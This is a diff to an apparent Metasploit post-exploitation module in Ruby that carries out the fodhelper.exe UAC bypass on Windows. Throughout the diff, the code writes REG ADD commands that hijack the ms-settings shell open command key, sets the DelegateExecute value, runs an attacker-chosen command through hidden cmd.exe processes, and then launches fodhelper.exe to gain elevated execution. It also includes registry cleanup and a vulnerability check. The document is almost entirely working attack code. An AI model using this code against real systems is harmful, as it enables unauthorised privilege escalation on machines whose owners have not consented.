@@ -108,7 +108,7 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover: enigma0x3 | mattifestation | winscripting',  # vulnerability credits
                                 ],
  
-                        'Version'        => '$Revision: 1.0',
+                        'Version'        => '$Revision: 1.1',
                         'DisclosureDate' => 'jun 9 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -142,7 +142,6 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell -Command to execute our command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry hive/keys?' , false])
                         ], self.class) 
 
@@ -153,24 +152,13 @@ class MetasploitModule < Msf::Post
 # GAIN REMOTE CODE EXCUTION BY HIJACKING PROCESS
 #
 def ls_stage1
-
 session = client
-# arch = client.fs.file.expand_path("%ComSpec%")
-arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
-if arch_check == "C:\\Windows\\SysWOW64"
-  arch = "SysWOW64"
-else
-  arch = "System32"
-end
-
 
   r=''
   vul_serve = "fodhelper.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
-  comm_path = "%WINDIR%\\#{arch}\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" # registry hive key to be hijacked
-  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
   hij_value = "REG ADD HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f" # vuln reg value
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   #
@@ -231,27 +219,21 @@ end
       end
 
         #
-        # chose to execute a single command in cmd.exe syntax
-        # or to execute command using powershell.exe syntax
+        # config proper reg keys to be added to target registry
         #
-        if datastore['USE_POWERSHELL'] == true
-          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
-          print_good(" exec => Creating registry powershell command data")
-          print_good("   data: #{psh_comma} #{exec_comm}")
+          comm_defa = "#{hij_value}"
+          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{exec_comm}\" /f"
+          print_good(" exec => Creating registry cmd command data ..")
+          print_good("   data: #{hij_value}")
+          print_good("   data: #{regi_hive} /ve /t REG_SZ /d \"#{exec_comm}\" /f")
           Rex::sleep(1.0)
-        else
-          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
-          print_good(" exec => Creating registry cmd command data")
-          print_good("   data: #{comm_path} #{exec_comm}")
-          Rex::sleep(1.0)
-        end
 
- # Execute process hijacking in registry (cmd.exe OR powershell.exe) ..
- # REG ADD HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "powershell.exe -C start notepad.exe" /f
+
+ # Execute process hijacking in registry
  # REG ADD HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "cmd.exe /c start notepad.exe" /f
- print_good(" exec => Hijacking process to gain code execution ..")
- r = session.sys.process.execute("#{comm_path} #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
- r = session.sys.process.execute("#{comm_path} #{hij_value}", nil, {'Hidden' => true, 'Channelized' => true})
+ print_good(" exec => Hijacking registry to gain code execution ..")
+ r = session.sys.process.execute("cmd.exe /c #{comm_defa}", nil, {'Hidden' => true, 'Channelized' => true})
+ r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit 'enigma0x3' :D
  Rex::sleep(4.0)
 
@@ -259,7 +241,7 @@ end
       # start remote service to gain code execution
       #
       print_good(" exec => Starting #{vul_serve} native process ..")
-      r = session.sys.process.execute("#{comm_path} start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
     #
@@ -287,7 +269,6 @@ def ls_stage2
   session = client
   vul_serve = "fodhelper.exe" # vulnerable soft to be hijacked
   # vul_value = "DelegateExecute" # vulnerable reg value to create
-  comm_path = "%WINDIR%\\Sysnative\\cmd.exe /c" # cmd.exe %comspec% path
   chec_hive = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" # registry hive key to be hijacked
   reg_clean = "REG DELETE HKCU\\Software\\Classes\\ms-settings /f" # registry hive to be clean
   #
@@ -326,7 +307,7 @@ def ls_stage2
  #
  print_good(" exec => Deleting HKCU hive registry keys ..")
  print_good(" exec => cmd.exe /c #{reg_clean}")
- r = session.sys.process.execute("#{comm_path} #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
+ r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
 
@@ -366,7 +347,6 @@ def ls_stage3
   oscheck = client.fs.file.expand_path("%OS%")
   vuln_soft = "fodhelper.exe" # vulnerable soft to be hijacked
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  # vul_value = "DelegateExecute" # vulnerable reg value to create
   vuln_key = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" # vuln hijack key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   #
@@ -391,11 +371,9 @@ def ls_stage3
       vuln_stats = "#{vuln_key}"
       report_tw = "UAC BYPASS ACTIVE (ms-settings)"
     elsif registry_enumkeys("HKCU\\Software\\Classes")
-      vul_value = "NOT FOUND"
       vuln_stats = "HKCU\\Software\\Classes"
       report_tw = "POSSIBLE VULNERABLE (hive found)"
     else
-      vul_value = "NOT FOUND"
       vuln_stats = "HKCU\\Software\\Classes"
       report_tw = "NOT VULNERABLE (hive not found)"
     end
@@ -429,7 +407,6 @@ def ls_stage3
     print_line("    TARGET_OS   : #{oscheck}")
     print_line("    UAC_LEVEL   : #{report_level}")
     print_line("")
-    print_line("    HIJACK_KEY  : (default)")
     print_line("    HIJACK_HIVE : #{vuln_stats}")
     print_line("    VULN_STATUS : #{report_tw}")
     print_line("")
